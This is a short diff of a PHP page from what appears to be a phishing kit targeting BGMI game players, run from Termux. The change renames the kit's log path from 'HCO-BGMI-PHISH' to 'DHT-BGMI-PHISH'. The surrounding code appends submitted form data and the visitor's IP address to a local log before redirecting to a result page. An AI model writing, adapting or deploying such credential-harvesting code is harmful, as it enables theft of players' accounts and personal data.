@@ -27,7 +27,7 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
     $log .= "IP Address: {$data['ip']}\n";
     $log .= "===========================================\n";
 
-    file_put_contents("/data/data/com.termux/files/home/HCO-BGMI-PHISH/data.log", $log, FILE_APPEND | LOCK_EX);
+    file_put_contents("/data/data/com.termux/files/home/DHT-BGMI-PHISH/data.log", $log, FILE_APPEND | LOCK_EX);
     $_SESSION['submission'] = $data;
     header("Location: result.php");
     exit();
@@ -60,4 +60,3 @@ ob_end_flush();
   </div>
 </body>
 </html>
-
